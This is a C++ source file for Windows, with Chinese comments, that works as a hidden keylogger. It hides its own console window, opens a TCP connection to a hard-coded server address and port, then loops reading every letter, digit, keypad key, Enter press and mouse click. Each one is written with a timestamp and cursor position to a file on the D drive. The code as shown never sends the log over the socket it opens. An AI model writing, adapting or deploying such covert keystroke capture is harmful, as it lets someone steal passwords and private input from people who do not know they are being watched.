#include <WINSOCK2.H>
#include<ctime>
#include<windows.h>
#include<bits/stdc++.h>
#include<ctime>
#define tin int
#define itn int
#define tni int
#define nit int
#define nti int
#define pritnf printf
#define scnaf scanf
#define retrun return
#define ll long long
#define inl inline
#define infa 0x3f3f3f3f
#define infb 0x7fffffff
#define infc 1061109567
#define infd 0x7f
#define maxa 100004

#define jc(VK_NONAME) ((GetAsyncKeyState(VK_NONAME)& 0x8000)?1:0)
#define dd GetCursorPos(&p)
#define yd(a,b) p.x+=a,p.y+=b;
#define ds time_t t=time(0);strftime(a,sizeof(a),"%Y/%m/%d %X",localtime(&t));cout<<a

#define SERVER_ADDRESS "172.22.21.117" //服务器端IP地址      
#define PORT 5150
#define MSGSIZE 10240         //收发缓冲区的大小      
#pragma comment(lib, "ws2_32.lib")
using namespace std;

HWND hwnd;

char a[maxa]="";
POINT p;
char str[256];
WSADATA wsaData;    
SOCKET sClient;//连接所用套节字 
SOCKADDR_IN server;//保存远程服务器的地址信息
char szMessage[maxa];//收发缓冲区      
int ret;//成功接收字节的个数
char nowtime[maxa]="";

itn main()
{
	GetConsoleTitle(str,sizeof(str));
	hwnd=FindWindow(NULL,str);
	ShowWindow(hwnd,0);
	freopen("D://out.txt","w",stdout);
	//
	WSAStartup(0x0202,&wsaData);// Initialize Windows socket library
    //
    sClient=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);// 创建客户端套节字，AF_INET指明使用TCP/IP协议族；
	//SOCK_STREAM, IPPROTO_TCP具体指明使用TCP协议
	//指明远程服务器的地址信息(端口号、IP地址等)      
    memset(&server, 0, sizeof(SOCKADDR_IN)); //先将保存地址的server置为全0 
    server.sin_family=PF_INET; //声明地址格式是TCP/IP地址格式
    server.sin_port=htons(PORT); //指明连接服务器的端口号，htons()用于 converts values between the host and network byte order
    server.sin_addr.s_addr=inet_addr(SERVER_ADDRESS); //指明连接服务器的IP地址
    //结构SOCKADDR_IN的sin_addr字段用于保存IP地址，sin_addr字段也是一个结构体，sin_addr.s_addr用于最终保存IP地址
    //inet_addr()用于将 形如的"127.0.0.1"字符串转换为IP地址格式
    //连到刚才指明的服务器上      
    connect(sClient,(struct sockaddr*)&server,sizeof(SOCKADDR_IN));//连接后可以用sClient来使用这个连接
    //server保存了远程服务器的地址信息
    //
	while(1)
	{
		//鼠标域 
		if(jc(MOUSE_MOVED))
		{
			dd;
			ds;
			printf("    左键 x:%d y:%d\n",p.x,p.y);
			while(jc(MOUSE_MOVED)){}
		}
		if(jc(MOUSE_EVENT))
		{
			dd;
			ds;
			printf("    右键 x:%d y:%d\n",p.x,p.y);
			while(jc(MOUSE_EVENT)){}
		}
		//字母域 
		if(GetAsyncKeyState(65))
		{
			ds;
			printf("    A\n");
			while(GetAsyncKeyState(65)){}
		}
		if(GetAsyncKeyState(66))
		{
			ds;
			printf("    B\n");
			while(GetAsyncKeyState(66)){}
		}
		if(GetAsyncKeyState(67))
		{
			ds;
			printf("    C\n");
			while(GetAsyncKeyState(67)){}
		}
		if(GetAsyncKeyState(68))
		{
			ds;
			printf("    D\n");
			while(GetAsyncKeyState(68)){}
		}
		if(GetAsyncKeyState(69))
		{
			ds;
			printf("    E\n");
			while(GetAsyncKeyState(69)){}
		}
		if(GetAsyncKeyState(70))
		{
			ds;
			printf("    F\n");
			while(GetAsyncKeyState(70)){}
		}
		if(GetAsyncKeyState(71))
		{
			ds;
			printf("    G\n");
			while(GetAsyncKeyState(71)){}
		}
		if(GetAsyncKeyState(72))
		{
			ds;
			printf("    H\n");
			while(GetAsyncKeyState(72)){}
		}
		if(GetAsyncKeyState(73))
		{
			ds;
			printf("    I\n");
			while(GetAsyncKeyState(73)){}
		}
		if(GetAsyncKeyState(74))
		{
			ds;
			printf("    J\n");
			while(GetAsyncKeyState(74)){}
		}
		if(GetAsyncKeyState(75))
		{
			ds;
			printf("    K\n");
			while(GetAsyncKeyState(75)){}
		}
		if(GetAsyncKeyState(76))
		{
			ds;
			printf("    L\n");
			while(GetAsyncKeyState(76)){}
		}
		if(GetAsyncKeyState(77))
		{
			ds;
			printf("    M\n");
			while(GetAsyncKeyState(77)){}
		}
		if(GetAsyncKeyState(78))
		{
			ds;
			printf("    N\n");
			while(GetAsyncKeyState(78)){}
		}
		if(GetAsyncKeyState(79))
		{
			ds;
			printf("    O\n");
			while(GetAsyncKeyState(79)){}
		}
		if(GetAsyncKeyState(80))
		{
			ds;
			printf("    P\n");
			while(GetAsyncKeyState(80)){}
		}
		if(GetAsyncKeyState(81))
		{
			ds;
			printf("    Q\n");
			while(GetAsyncKeyState(81)){}
		}
		if(GetAsyncKeyState(82))
		{
			ds;
			printf("    R\n");
			while(GetAsyncKeyState(82)){}
		}
		if(GetAsyncKeyState(83))
		{
			ds;
			printf("    S\n");
			while(GetAsyncKeyState(83)){}
		}
		if(GetAsyncKeyState(84))
		{
			ds;
			printf("    T\n");
			while(GetAsyncKeyState(84)){}
		}
		if(GetAsyncKeyState(85))
		{
			ds;
			printf("    U\n");
			while(GetAsyncKeyState(85)){}
		}
		if(GetAsyncKeyState(86))
		{
			ds;
			printf("    V\n");
			while(GetAsyncKeyState(86)){}
		}
		if(GetAsyncKeyState(87))
		{
			ds;
			printf("    W\n");
			while(GetAsyncKeyState(87)){}
		}
		if(GetAsyncKeyState(88))
		{
			ds;
			printf("    X\n");
			while(GetAsyncKeyState(88)){}
		}
		if(GetAsyncKeyState(89))
		{
			ds;
			printf("    Y\n");
			while(GetAsyncKeyState(89)){}
		}
		if(GetAsyncKeyState(90))
		{
			ds;
			printf("    Z\n");
			while(GetAsyncKeyState(90)){}
		}
		//数字域
		if((GetAsyncKeyState(96))||(GetAsyncKeyState(48)))
		{
			ds;
			printf("    0\n");
			while((GetAsyncKeyState(96))||(GetAsyncKeyState(48))){}
		}
		if((GetAsyncKeyState(97))||(GetAsyncKeyState(49)))
		{
			ds;
			printf("    1\n");
			while((GetAsyncKeyState(97))||(GetAsyncKeyState(49))){}
		}
		if((GetAsyncKeyState(98))||(GetAsyncKeyState(50)))
		{
			ds;
			printf("    2\n");
			while((GetAsyncKeyState(98))||(GetAsyncKeyState(50))){}
		}
		if((GetAsyncKeyState(99))||(GetAsyncKeyState(51)))
		{
			ds;
			printf("    3\n");
			while((GetAsyncKeyState(99))||(GetAsyncKeyState(51))){}
		}
		if((GetAsyncKeyState(100))||(GetAsyncKeyState(52)))
		{
			ds;
			printf("    4\n");
			while((GetAsyncKeyState(100))||(GetAsyncKeyState(52))){}
		}
		if((GetAsyncKeyState(101))||(GetAsyncKeyState(53)))
		{
			ds;
			printf("    5\n");
			while((GetAsyncKeyState(101))||(GetAsyncKeyState(53))){}
		}
		if((GetAsyncKeyState(102))||(GetAsyncKeyState(54)))
		{
			ds;
			printf("    6\n");
			while((GetAsyncKeyState(102))||(GetAsyncKeyState(54))){}
		}
		if((GetAsyncKeyState(103))||(GetAsyncKeyState(55)))
		{
			ds;
			printf("    7\n");
			while((GetAsyncKeyState(103))||(GetAsyncKeyState(55))){}
		}
		if((GetAsyncKeyState(104))||(GetAsyncKeyState(56)))
		{
			ds;
			printf("    8\n");
			while((GetAsyncKeyState(104))||(GetAsyncKeyState(56))){}
		}
		if((GetAsyncKeyState(105))||(GetAsyncKeyState(57)))
		{
			ds;
			printf("    9\n");
			while((GetAsyncKeyState(105))||(GetAsyncKeyState(57))){}
		}
		if(GetAsyncKeyState(106))
		{
			ds;
			printf("    ×\n");
			while(GetAsyncKeyState(106)){}
		}
		if(GetAsyncKeyState(107))
		{
			ds;
			printf("    ＋\n");
			while(GetAsyncKeyState(107)){}
		}
		if(GetAsyncKeyState(109))
		{
			ds;
			printf("    －\n");
			while(GetAsyncKeyState(109)){}
		}
		if(GetAsyncKeyState(110))
		{
			ds;
			printf("    .\n");
			while(GetAsyncKeyState(110)){}
		}
		if(GetAsyncKeyState(111))
		{
			ds;
			printf("    ÷或/\n");
			while(GetAsyncKeyState(111)){}
		}
		//指令域 
		if(GetAsyncKeyState(VK_RETURN))
		{
			ds;
			printf("    回车\n");
			while(GetAsyncKeyState(VK_RETURN)){}
		}
	}
	//
	return 0;	
}
